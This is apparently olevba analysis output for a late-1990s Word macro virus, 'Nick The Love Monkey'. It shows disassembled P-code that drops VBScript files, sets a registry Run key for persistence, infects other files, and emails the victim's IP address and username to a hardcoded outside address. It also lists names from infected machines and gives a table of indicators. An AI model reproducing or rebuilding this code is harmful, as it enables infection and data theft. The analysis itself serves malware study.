' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "IV11 = TS.ReadAll"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "TS.Close"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "If mid(IV11,(len(IV11)-2),1) <> "¥" Then"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 8)"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "TS.Write IV3"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "TS.Close"
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "FIV11 (IV7)"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "If T111 = False Then"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005D "WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVM", IV7"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "Set U187 = IV6.OpenTextFile(IV7, 2, True)"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "U187.Write IV3"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "U187.Close"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Function FIV11(filespec)"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Set IV6 = CreateObject("Scripting.FileSystemObject")"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "If (IV6.FileExists(filespec)) Then"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "T111 = True"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Else"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "T111 = False"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "End Function"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005C "' Nick "The Love Monkey" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "'¥"
' 	PrintItemNL 
' Line #130:
' 	LitStr 0x0004 "Done"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0007 "AVM-VBS"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #131:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #132:
' 	LitStr 0x0014 "wscript c:\happy.vbs"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #133:
' 	EndIfBlock 
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' 	LitStr 0x0009 "c:\A4.vbs"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Dim theApp, theNameSpace, theMailItem"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Dim IPSocket"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "Set IPSocket = CreateObject("MSWinsock.Winsock")"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "IPADDY = IPSocket.LocalIP"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "set BOB = CreateObject("Wscript.Network")"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "For x = 1 To 2"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0056 "If x = 1 Then EMADDY = "hia@uidivo.deltanet.ro" Else EMADDY = "hia@uidivo.deltanet.ro""
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "if x = 1 then MSGBDY = IPADDY & "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld gen 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0029 " else MSGBDY = "Dear Nicky... my name is "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0043 " and I want to make hot monkey love with you. You anti-virus stud!""
' 	Concat 
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "Set theApp = WScript.CreateObject("Outlook.Application")"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Set theNameSpace = theApp.GetNameSpace("MAPI")"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "theNameSpace.Logon "profile", "password""
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Set theMailItem = theApp.CreateItem(0)"
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "theMailItem.Recipients.Add EMADDY"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "theMailItem.Subject = BOB.Username"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "theMailItem.Body = MSGBDY"
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "theMailItem.Send"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "theNameSpace.Logoff"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld theMailItem 
' 	MemLd Recipients 
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld theNameSpace 
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #162:
' 	LitStr 0x0011 "wscript c:\a4.vbs"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #163:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld A 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld A 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #164:
' 	QuoteRem 0x0000 0x005E " Nick "The Love Monkey" v2 Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
' Line #165:
' 	QuoteRem 0x0000 0x0039 "Hugh G. Rection Loves Nicky F. Also! 11/14/98 10:56:30 AM"
' Line #166:
' 	QuoteRem 0x0000 0x003A "James Matthiessen Loves Nicky F. Also! 11/14/98 1:15:12 PM"
' Line #167:
' 	QuoteRem 0x0000 0x0036 "Russell Wigart Loves Nicky F. Also! 12/2/98 8:55:28 PM"
' Line #168:
' 	QuoteRem 0x0000 0x0034 "RYAN HANSEN Loves Nicky F. Also! 12/3/98 10:03:48 PM"
' Line #169:
' 	QuoteRem 0x0000 0x003F "College of Agriculture Loves Nicky F. Also! 12/9/98 10:06:43 AM"
' Line #170:
' 	QuoteRem 0x0000 0x003F "College of Agriculture Loves Nicky F. Also! 12/9/98 10:18:22 AM"
' Line #171:
' 	QuoteRem 0x0000 0x002D "LR&C Loves Nicky F. Also! 12/9/98 12:22:53 PM"
' Line #172:
' 	QuoteRem 0x0000 0x0039 "Preferred Customer Loves Nicky F. Also! 1/6/99 3:13:52 PM"
' Line #173:
' 	QuoteRem 0x0000 0x0039 "Matthew Glagolich Loves Nicky F. Also! 1/15/99 3:15:17 PM"
' Line #174:
' 	QuoteRem 0x0000 0x002D "steph Loves Nicky F. Also! 1/19/99 3:53:32 PM"
' Line #175:
' 	QuoteRem 0x0000 0x0030 "student Loves Nicky F. Also! 1/20/99 10:03:04 AM"
' Line #176:
' 	QuoteRem 0x0000 0x002E "student Loves Nicky F. Also! 3/4/99 7:55:33 PM"
' Line #177:
' 	QuoteRem 0x0000 0x002E "student Loves Nicky F. Also! 3/4/99 7:59:49 PM"
' Line #178:
' 	QuoteRem 0x0000 0x0034 "Soquani Wilde Loves Nicky F. Also! 3/8/99 3:24:11 PM"
' Line #179:
' 	QuoteRem 0x0000 0x0030 "Student Loves Nicky F. Also! 3/11/99 10:27:36 PM"
' Line #180:
' 	QuoteRem 0x0000 0x0036 "jaime allison Loves Nicky F. Also! 3/11/99 10:35:57 PM"
' Line #181:
' 	QuoteRem 0x0000 0x002F "Student Loves Nicky F. Also! 4/11/99 9:02:42 PM"
' Line #182:
' 	QuoteRem 0x0000 0x002F "Student Loves Nicky F. Also! 4/11/99 9:26:38 PM"
' Line #183:
' 	QuoteRem 0x0000 0x002F "Student Loves Nicky F. Also! 4/13/99 3:17:22 PM"
' Line #184:
' 	QuoteRem 0x0000 0x003A "Jason Kistenmacher Loves Nicky F. Also! 4/14/99 4:30:56 PM"
' Line #185:
' 	QuoteRem 0x0000 0x0030 "Student Loves Nicky F. Also! 4/26/99 12:18:33 PM"
' Line #186:
' 	QuoteRem 0x0000 0x002F "Student Loves Nicky F. Also! 5/17/99 8:30:50 PM"
' Line #187:
' 	QuoteRem 0x0000 0x0036 "AIESEC Brasov Loves Nicky F. Also! 5/18/99 10:21:37 AM"
' Line #188:
' 	QuoteRem 0x0000 0x002F "Raluca Loves Nicky F. Also! 27.05.1999 19:05:08"
' Line #189:
' 	QuoteRem 0x0000 0x0031 "Catalina Loves Nicky F. Also! 01.03.2000 10:10:06"
' Line #190:
' 	QuoteRem 0x0000 0x0031 "Catalina Loves Nicky F. Also! 13.03.2000 13:26:49"
' Line #191:
' 	QuoteRem 0x0000 0x002D "Yogy Loves Nicky F. Also! 06/24/2000 04:13:28"
' Line #192:
' 	QuoteRem 0x0000 0x002D "radu Loves Nicky F. Also! 27.07.2000 23:31:13"
' Line #193:
' 	QuoteRem 0x0000 0x002E "nobody Loves Nicky F. Also! 7/25/2000 22:13:19"
' Line #194:
' 	QuoteRem 0x0000 0x002B "cata Loves Nicky F. Also! 25.07.00 23:34:37"
' Line #195:
' 	QuoteRem 0x0000 0x0033 "Michael Horn Loves Nicky F. Also! 15.09.00 20:41:45"
' Line #196:
' 	QuoteRem 0x0000 0x0030 "11111 Loves Nicky F. Also! 11/15/2000 8:13:32 PM"
' Line #197:
' 	EndSub 
' Line #198:
' 	FuncDefn (Private Sub Document_New())
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0030 "11111 Loves Nicky F. Also! 12/19/2000 8:56:44 PM"
' Line #201:
' 	QuoteRem 0x0000 0x0036 "Total Konfuzion Loves Nicky F. Also! 04.12.00 12:57:03"
' Line #202:
' 	QuoteRem 0x0000 0x003E "Righard J. Zwienenberg Loves Nicky F. Also! 1/9/01 11:26:58 AM"
' Line #203:
' 	QuoteRem 0x0000 0x0039 "Replication System Loves Nicky F. Also! 11/01/01 16:19:57"
' Line #204:
' 	QuoteRem 0x0000 0x0036 "Total Konfuzion Loves Nicky F. Also! 22.02.01 10:59:07"
' Line #205:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |happy.vbs           |Executable file name                         |
|IOC       |avm.vbs             |Executable file name                         |
|IOC       |A4.vbs              |Executable file name                         |
|IOC       |a4.vbs              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

